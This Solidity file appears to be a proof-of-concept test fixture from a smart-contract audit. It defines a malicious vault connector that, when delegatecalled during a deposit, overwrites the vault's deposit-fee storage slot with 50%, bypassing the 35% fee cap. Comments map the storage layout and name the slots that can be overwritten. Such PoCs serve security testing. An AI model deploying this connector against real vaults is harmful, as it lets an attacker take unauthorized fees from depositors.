// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {IConnector} from "../../src/kiln/IConnector.sol";

/// @dev Vault's ERC-7201 storage location constant.
///      Embedded in compiled bytecode — publicly observable.
bytes32 constant VAULT_STORAGE_LOCATION = 0x6bb5a2a0ae924c2ea94f037035a09f65614421e2a7d96c9bcbd59acdd32e6000;

/// @notice Connector that, when invoked via functionDelegateCall from
///         Vault._deposit(), overwrites VaultStorage._depositFee (slot 2)
///         with a value exceeding the intended _MAX_FEE cap of 35%.
///
///         The _depositFee is computed *before* the delegatecall in the
///         deposit flow, so the current transaction is unaffected.
///         However, the overwritten value PERSISTS — and on the next
///         deposit, the fee is computed against the attacker-chosen rate,
///         bypassing the protocol's built-in maximum-fee enforcement.
///
///         VaultStorage layout (within ERC-7201 anchor):
///           +0: IConnectorRegistry _connectorRegistry
///           +1: bytes32 _connectorName
///           +2: uint256 _depositFee        (target — safe to overwrite)
///           +3: uint256 _rewardFee
///           +4: uint256 _lastTotalAssets   (target — safe to overwrite)
///           +5: uint256 _minTotalSupply
///           +6: bool _transferable + uint8 _offset  (packed)
///           +7: uint256 _collectableRewardFeesShares
///           +8: IBlockList _blockList
///           +9: bool _depositPaused (packed)
///          +10: IAdditionalRewardsStrategy _additionalRewardsStrategy
///          +11: IFeeDispatcher _feeDispatcher
contract FeeOverrideConnector is IConnector {
    function totalAssets(IERC20) external pure override returns (uint256) {
        // Return a small value to ensure the deposit preview succeeds.
        return 10;
    }

    function deposit(IERC20, uint256) external override {
        // Override VaultStorage._depositFee to 50% = 50 * 10**6
        // This bypasses the _MAX_FEE cap of 35 (enforced by Vault.setDepositFee)
        bytes32 depositFeeSlot = bytes32(uint256(VAULT_STORAGE_LOCATION) + 2);
        bytes32 fiftyPercent = bytes32(uint256(50 * 10 ** 6));
        assembly {
            sstore(depositFeeSlot, fiftyPercent)
        }
    }

    function withdraw(IERC20, uint256) external override {}
    function claim(IERC20, IERC20, bytes calldata) external override returns (uint256) { return 0; }
    function reinvest(IERC20, IERC20, bytes calldata) external override {}
    function maxDeposit(IERC20) external pure override returns (uint256) { return type(uint256).max; }
    function maxWithdraw(IERC20) external pure override returns (uint256) { return type(uint256).max; }
}
